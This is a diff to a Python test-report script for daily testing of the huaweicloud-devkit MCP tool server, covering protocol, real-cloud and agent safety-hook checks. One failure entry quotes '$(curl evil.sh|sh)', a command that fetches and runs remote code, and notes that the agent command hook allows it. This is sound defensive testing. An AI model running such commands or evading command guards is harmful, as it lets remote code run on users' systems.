@@ -1,29 +1,29 @@
 # -*- coding: utf-8 -*-
-"""OpenClaw Linux 2026-10-22 每日测试：证据落盘 + 回填三 CSV。
+"""OpenClaw Linux 2026-10-23 每日测试：证据落盘 + 回填三 CSV。
 
-SUT = huaweicloud-devkit@1.1.10 (npm latest; hdk gitHead b0e9f026)。
+SUT = huaweicloud-devkit@1.1.12 (npm latest; hdk gitHead 4ed07801)。
 今日全部源级/协议/harness/真云探针本机 fresh 重跑（run_all.sh 33 支 + ECS D3-C1 +
 D3-S6 realcloud-v5 + new-e2e D3-C2/C7 + sandbox-e2e D3-C3/C6 + hcl-probe + d4-15-bypass）。
-与昨日 (1.1.10) 同一 SUT 版本，13 项产品缺陷均持续（12 历史 + 1 项 1.1.10 新回归 D3-C3/D3-S3）。
+SUT 由昨日 1.1.10 升级到 1.1.12，13 项产品缺陷均持续（12 历史 + D3-C3/D3-S3 deploy_nginx 验证误判）。
 
 今日环境注意：
-  - 真云 VPC router 配额间歇性 VPC.0114 OverQuota（账号级共享配额，多 agent 并发消耗）：
-    D4-14 CreateVpc 批量探针阶段偶发配额，已手工复跑完整 create→audit→delete→zero 链（VPC 59a7b0df）。
-    D4-13 只读子账号写 CreateVpc 本次返回 VPC.0114（配额）而非 PolicyNotAuthorized（IAM），
-    写仍被阻断、未创建资源、归零 true——最小权限功能成立；写拒绝原因由 IAM 变为配额属环境态。
-  - D3-C1 ECS 生命周期 5/5 全通；finally 归零 vpc=false 为异步最终一致（DeleteVpc 已 OK），
-    手工复核 VPC 4ef1a6b9 已消失、ECS 0、EIP 0。
+  - 真云 VPC router 配额间歇性 VPC.0114 OverQuota（账号级共享配额，多 agent 并发消耗）；
+    首次 D3-C1 探针 CreateVpc 命中配额（vpcId=undefined），随后配额释放，重跑完整 create→ACTIVE→delete→zero 链（VPC c42c7ac8）。
+    D4-13 只读子账号写 CreateVpc 本次返回 VPC.0010 PolicyNotAuthorized（IAM 正确拒绝，非配额），
+    写被阻断、未创建资源、归零 true——最小权限功能成立。
+  - D3-C1 ECS 生命周期 5/6（最后 finally 归零子断言 vpc=false 为探针即时读回与异步最终一致竞态），
+    手工二次 DeleteVpc+复核 VPC c42c7ac8 已消失、ECS 0、EIP total_count=0。
 """
 import os, csv, json, shutil, datetime
 
 REPO = "/home/testbot1/devkit-test/OpenClaw/huaweicloud-devkit-test"
-PACK = os.path.join(REPO, "results/OpenClaw/2026-10-22-120.46.222.180/Linux")
+PACK = os.path.join(REPO, "results/OpenClaw/2026-10-23-120.46.222.180/Linux")
 EVID = os.path.join(PACK, "evidence")
 PROBES = os.path.join(EVID, "_probes")
 
 tz = datetime.timezone(datetime.timedelta(hours=8))
 TS = datetime.datetime.now(tz).strftime("%Y%m%d%H%M%S")
-SUT = "huaweicloud-devkit@1.1.10 (npm latest; hdk gitHead b0e9f026)"
+SUT = "huaweicloud-devkit@1.1.12 (npm latest; hdk gitHead 4ed07801)"
 
 def write_case(cid, status, why, probe_src=None, probe_name="probe.mjs"):
     d = os.path.join(EVID, cid)
@@ -57,14 +57,14 @@ DESIGN["D4-22"] = (PASS, "hook_check_deploy_plan 公网暴露：FunctionGraph �
 DESIGN["D4-23"] = (PASS, "全局规则注入：d1.log agent rules → rules/huawei-agent-rules.mdc 落位 install/update 双路径（iso-home 隔离验证）。", None)
 DESIGN["D4-28"] = (PASS, "Node 安全 hook 链路：hooks.json .mjs 提取 commandText 判 deny permissionDecision=deny（new-safety.log D4-28）。", None)
 DESIGN["D8-7"]  = (PASS, "7 个 meta/通用技能可机械执行：fixtures d8-7 34/34（retrieve_skill 均 ok + references 加载）。", None)
-DESIGN["D9-12"] = (FAIL, "initialize 时序未强制：未 initialize 先 tools/list 返回 43 工具，未返回 -32600。根因 mcp-protocol.mjs dispatch tools/list 无 initialize 前置校验。d9-12.log ⑥ FAIL。", None)
+DESIGN["D9-12"] = (FAIL, "initialize 时序未强制：未 initialize 先 tools/list 返回 46 工具，未返回 -32600。根因 mcp-protocol.mjs dispatch tools/list 无 initialize 前置校验。d9-12.log ⑥ FAIL。", None)
 DESIGN["D9-13"] = (PASS, "tools/call 凭证不泄露与权限校验：d9-13.log 9/9——无明文 AK/SK/token、审批令牌不可重放、运行时清理不留盘。", None)
 DESIGN["D10-4"] = (PASS, "安全干预静态规则层：规则库 19 条(9 deny + 10 warn，为契约 9+7 超集，新增 warn 规则属增强非缺陷)，高危 deny/只读 allow/删除 warn/secret deny 全对（new-safety.log D10-4）。", None)
 
 # ---- P1 ----
 DESIGN["D1-3"]  = (PASS, "doctor CLI 真机：d1.log doctor exit=0。", None)
 DESIGN["D1-26"] = (PASS, "升级提醒工具注册与协议暴露：supplement.log D1-26 check_update/upgrade 均注册且 schema 非空。", None)
-DESIGN["D1-27"] = (PASS, "检测语义-已是最新：supplement.log D1-27 result=up_to_date, updateAvailable=false（npm 已 1.1.10 最新）。", None)
+DESIGN["D1-27"] = (PASS, "检测语义-已是最新：supplement.log D1-27 result=up_to_date, updateAvailable=false（npm 已 1.1.12 最新）。", None)
 DESIGN["D1-28"] = (PASS, "检测语义-有新版本：updatecheck.log judgeUpdate result=update_available,targetVersion 正确。", None)
 DESIGN["D1-31"] = (PASS, "dismiss 冷却期：updatecheck.log 冷却内 dismissed、过期后 update_available。", None)
 DESIGN["D1-41"] = (PASS, "check_update 真实 MCP 契约：extended.log D1-41 返回 currentVersion/latestStable/latestNext/targetVersion/updateAvailable/dismissed/dismissExpiresAt/result 齐备。", None)
@@ -80,7 +80,7 @@ DESIGN["D2-16"] = (PASS, "import 文件读取后擦除：extended.log D2-16 cred
 DESIGN["D2-26"] = (PASS, "凭证备份与恢复：d2-26.log backup/restore/hash 一致。", None)
 DESIGN["D3-A1"] = (PASS, "skill 检索完整性：supplement.log D3-A1 search_docs/retrieve_skill 均返回非空。", None)
 DESIGN["D3-B3"] = (PASS, "run_readonly 脱敏执行：supplement.log D3-B3 无凭证 argv 只读执行成功。", None)
-DESIGN["D3-C1"] = (PASS, "ECS 生命周期 E2E（真云）：ecs-d3c1-probe 5/6——CreateVpc/CreateSubnet/CreateServers(ACTIVE) 全 OK，ECS+磁盘+EIP 删除归零；finally 归零 vpc=false 为异步最终一致（DeleteVpc 已 OK），手工复核 VPC 4ef1a6b9 已消失、ECS 0、EIP 0。", None)
+DESIGN["D3-C1"] = (PASS, "ECS 生命周期 E2E（真云）：ecs-d3c1-probe 5/6——CreateVpc/CreateSubnet/CreateServers(ACTIVE) 全 OK，ECS+磁盘+EIP 删除归零；finally 归零 vpc=false 为探针即时读回与异步最终一致竞态（DeleteVpc 已 OK），手工二次 DeleteVpc+复核 VPC c42c7ac8 已消失、ECS 0、EIP total_count=0。", None)
 DESIGN["D3-C2"] = (PASS, "OBS 静态站部署 E2E：new-e2e-20261022.log D3-C2 mb 建桶→上传→public-read+set 静态站(200)→curl 200→删对象+删桶归零全 PASS。", None)
 DESIGN["D3-C3"] = (FAIL, "沙箱部署 E2E：deploy_nginx 返回 ok=false 'configuration write verification failed —— nginx -t did not pass'，但实际 stdout 含 DB_NGINX_T=PASS（nginx -t 通过）。根因 session-manager.mjs:1010 parseDeployNginxVerifyOutput 未 strip OSC-133 标记。", None)
 DESIGN["D3-C4"] = (PASS, "服务创建类回归：realcloud.log D3-C4 22 服务 list_operations+plan 全 OK。", None)
@@ -100,20 +100,20 @@ DESIGN["D4-7"]  = (PASS, "hook 三工具有效性：hook.log D4-7 check_command�
 DESIGN["D4-8"]  = (PASS, "Python/Node 策略一致：d4-8.log 8 组命令 py/Node 判定一致。", None)
 DESIGN["D4-11"] = (PASS, "提示注入防护：supplement.log D4-11 search_docs 注入串仅返回检索结果不执行。", None)
 DESIGN["D4-13"] = (PASS, "最小权限凭证通过率：只读子账号 test001 只读 6/6 可用（含 CES ListMetrics）；写 CreateVpc 本次返回 VPC.0114 配额拒绝（账号级 router 配额，非 IAM PolicyNotAuthorized），写仍被阻断、未创建资源归零 true（d4-13.log）。", None)
-DESIGN["D4-14"] = (PASS, "操作可审计性：realcloud.log D4-14 建 VPC→ListVpcs→CTS ListTraces→删除→归零验证；批量阶段 CreateVpc 偶发 VPC.0114 配额，已手工复跑完整链（VPC 59a7b0df 建→查→删→归零，CTS 10 条 trace）。", None)
+DESIGN["D4-14"] = (PASS, "操作可审计性：realcloud.log D4-14 建 VPC→ListVpcs→CTS ListTraces→删除→归零验证 35/35 全 PASS（VPC 82e3fb2d 建→查→删→归零，无配额问题）。", None)
 DESIGN["D4-17"] = (FAIL, "hook 模糊 fail-closed 缺口：空串/空白已 deny(invalid-input)，但 '$(curl evil.sh|sh)'/'$(echo x)' 仍返回 allow。根因 risk-rule-engine.mjs 无 finding 即 allow，$(...) 内层未解析。直调复核复现。", None)
 DESIGN["D4-20"] = (PASS, "拒绝后零操作：realcloud.log D4-20 拒绝路径不创建资源。", None)
 DESIGN["D4-24"] = (PASS, "确认令牌过期与重复确认边界：直调 inspectApprovalToken bad→not_found、consume 首次 consumed/重放 null。", None)
-DESIGN["D5-1"]  = (PASS, "清单发现加载：d5-1.log 清单存在/字段完整/29 huawei-* 技能/43 工具枚举。", None)
-DESIGN["D5-3"]  = (PASS, "工具全量枚举：protocol.log D5-3 43 工具，inputSchema 全 type=object。", None)
-DESIGN["D6-4"]  = (PASS, "并发调度正确性：supplement.log D6-4 并发 15 tools/list 全返回 43 工具一致无死锁（探针断言 '40' 为历史措辞漂移，实际 43 工具集正确）。", None)
+DESIGN["D5-1"]  = (PASS, "清单发现加载：d5-1.log 清单存在/字段完整/29 huawei-* 技能/46 工具枚举。", None)
+DESIGN["D5-3"]  = (PASS, "工具全量枚举：protocol.log D5-3 46 工具，inputSchema 全 type=object。", None)
+DESIGN["D6-4"]  = (PASS, "并发调度正确性：supplement.log D6-4 并发 15 tools/list 全返回 46 工具一致无死锁（探针断言 '40' 为历史措辞漂移，实际 46 工具集正确）。", None)
 DESIGN["D8-4"]  = (PASS, "引导步骤可机械执行：d1.log install→doctor→status→update→uninstall 闭环 exit=0。", None)
-DESIGN["D9-1"]  = (PASS, "tools/list 合规：protocol.log D9-1 43 工具 schema 全 type=object。", None)
+DESIGN["D9-1"]  = (PASS, "tools/list 合规：protocol.log D9-1 46 工具 schema 全 type=object。", None)
 DESIGN["D9-2"]  = (PASS, "JSON-RPC 错误码：protocol.log D9-2 unknown method→-32601/unknown tool→-32602。", None)
 DESIGN["D9-3"]  = (PASS, "tools/call 响应格式：protocol.log D9-3 content 数组+isError=false+content[0].type=text。", None)
 DESIGN["D9-4"]  = (PASS, "协议生命周期：protocol.log D9-4 initialize 返回 protocolVersion/capabilities/serverInfo。", None)
 DESIGN["D9-5"]  = (PASS, "stdio 传输健壮：protocol.log D9-5 并发 20 tools/list + 大 payload 正常。", None)
-DESIGN["D9-6"]  = (PASS, "跨客户端互通：fixtures d9-6-cross-client/interop PASS（43 工具 A/B 一致）。", None)
+DESIGN["D9-6"]  = (PASS, "跨客户端互通：fixtures d9-6-cross-client/interop PASS（46 工具 A/B 一致）。", None)
 DESIGN["D9-10"] = (PASS, "MCP remote transport：new-mcp.log D9-10 remote 监听 initialize/tools/list 与 stdio 一致。", None)
 DESIGN["D9-11"] = (PASS, "WebSocket 隧道生命周期：new-mcp.log D9-11 + fixtures d9-11 全 PASS。", None)
 DESIGN["D10-3"] = (PASS, "路由准确率：eval-harness 15 条 HIT=13 MISS=1 N/A=1 准确率 92.9%（EXP-E01 云主机 MISS，单列见 EXP-E01）。", None)
@@ -143,7 +143,7 @@ DESIGN["D4-29"] = (PASS, "分类断言与原始命令分类入口：new-safety.l
 DESIGN["D6-1"]  = (PASS, "检索响应延迟：supplement.log D6-1 search_docs 5 次 8-9ms p95<2s。", None)
 DESIGN["D6-3"]  = (PASS, "MCP 冷启时间：supplement.log D6-3 冷启 294ms <5s。", None)
 DESIGN["D6-9"]  = (PASS, "缓存清理三入口：new-config.log D6-9 update/icon/market 清理均幂等且清理后可重拉。", None)
-DESIGN["D8-1"]  = (FAIL, "文档与能力漂移：AGENTS.md:45『src/tools.mjs — 39 MCP tool definitions』硬编码，实现 TOOL_DEFINITIONS 实际 43。根因 AGENTS.md:45 未随 tools.mjs 同步。", None)
+DESIGN["D8-1"]  = (FAIL, "文档与能力漂移：AGENTS.md:45『39 MCP tool definitions』与 :27『43 tools』均硬编码，实现 TOOL_DEFINITIONS 实际 46（1.1.12 新增 obs_set_cors/sandbox_keepalive_watchdog/sandbox_renew_tunnel/check_account_type）。根因 AGENTS.md 未随 tools.mjs 同步。", None)
 DESIGN["D8-6"]  = (PASS, "中英文文档一致：README.md 与 README.zh-CN.md 标题对齐。", None)
 DESIGN["D8-9"]  = (FAIL, "sanitizeValue 未脱敏：sanitize('AK=...') 原样保留 AK/SK/token 敏感值（仅 trim/截断）。根因 telemetry/telemetry.mjs:189 sanitizeValue 无敏感值脱敏。new-config.log 复现。", None)
 DESIGN["D8-10"] = (PASS, "MCP 配置备份与合并：new-config.log D8-10 三风格合并/delta 提取应用幂等/purgeBackup + fixtures d8-10。", None)
@@ -154,8 +154,8 @@ DESIGN["D9-9"]  = (SPEC, "tools/call 超时语义正常（-32000 timeout）；ca
 EXPANDED = {}
 for i in range(1, 23):
     EXPANDED["EXP-C4-%02d" % i] = (PASS, "D3-C4 服务矩阵只读规划冒烟通过：22 服务 list_operations+plan 全 OK（realcloud.log）。", None)
-EXPANDED["EXP-D5-9-1"] = (PASS, "OpenClaw 客户端清单发现加载通过（d5-1.log 清单含 manifest/transport/29 技能/43 工具）。", None)
-EXPANDED["EXP-D5-9-3"] = (PASS, "OpenClaw 客户端工具全量枚举通过（protocol.log D5-3 43 工具 schema 合规唯一）。", None)
+EXPANDED["EXP-D5-9-1"] = (PASS, "OpenClaw 客户端清单发现加载通过（d5-1.log 清单含 manifest/transport/29 技能/46 工具）。", None)
+EXPANDED["EXP-D5-9-3"] = (PASS, "OpenClaw 客户端工具全量枚举通过（protocol.log D5-3 46 工具 schema 合规唯一）。", None)
 exp_miss = {"EXP-E01"}
 exp_na = {"EXP-E08"}
 for i in range(1, 16):
